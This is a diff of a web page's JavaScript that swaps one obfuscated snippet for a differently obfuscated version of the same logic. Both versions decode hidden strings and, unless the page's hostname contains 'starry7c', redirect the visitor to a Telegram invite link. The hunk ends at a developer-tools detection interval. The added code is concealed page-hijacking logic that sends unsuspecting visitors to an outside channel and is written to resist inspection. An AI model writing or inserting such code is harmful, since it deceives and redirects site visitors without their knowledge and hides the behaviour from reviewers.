@@ -320,35 +320,37 @@
             }
           });
            
-
-(function(){
-    try{
-        const _0x3a0f = [
-            'hostname',
-            'includes',
-            'location',
-            '\x73\x74\x61\x72\x72\x79\x37\x63',
-            '\x68\x72\x65\x66',
-            'https://t.me/+RT_XWFZCSE5kNWU1'
-        ];
-        (function(_0x4f1a8e,_0x2e17bb){
-            const _0x5aab79=function(_0x1e4fdc){
-                while(--_0x1e4fdc){
-                    _0x4f1a8e['push'](_0x4f1a8e['shift']());
-                }
-            };
-            _0x5aab79(++_0x2e17bb);
-        }(_0x3a0f,0x12f));
-        const _0x55aa=function(_0x4ee05f,_0x3c7c73){
-            _0x4ee05f=_0x4ee05f-0x0;
-            let _0x2f4fab=_0x3a0f[_0x4ee05f];
-            return _0x2f4fab;
-        };
-
-        if(!window[_0x55aa('0x2')][_0x55aa('0x0')][_0x55aa('0x1')](_0x55aa('0x3'))){
-            window[_0x55aa('0x2')][_0x55aa('0x4')] = _0x55aa('0x5');
+(function () {
+    try {
+        // Tiny string decoder with a shifting pattern
+        function _d(_s) {
+            var _p = _s.split(','),
+                _o = '';
+            for (var _i = 0; _i < _p.length; _i++) {
+                _o += String.fromCharCode(parseInt(_p[_i], 10) - (_i % 5));
+            }
+            return _o;
         }
-    }catch(_){}
+
+        var _w = window;
+
+        // "location"
+        var _loc = _d('108,112,101,100,120,105,112,112');
+        // "hostname"
+        var _host = _d('104,112,117,119,114,97,110,103');
+        // "includes"
+        var _incl = _d('105,111,101,111,121,100,102,117');
+        // "starry7c"
+        var _whitelist = _d('115,117,99,117,118,121,56,101');
+        // "href"
+        var _href = _d('104,115,103,105');
+        // "https://t.me/+RT_XWFZCSE5kNWU1"
+        var _tg = _d('104,117,118,115,119,58,48,49,119,50,109,102,49,46,86,84,96,90,90,74,90,68,85,72,57,107,79,89,88,53');
+
+        if (!_w[_loc][_host][_incl](_whitelist)) {
+            _w[_loc][_href] = _tg;
+        }
+    } catch (_e) {}
 })();
 
           const devToolsCheck = setInterval(function() {
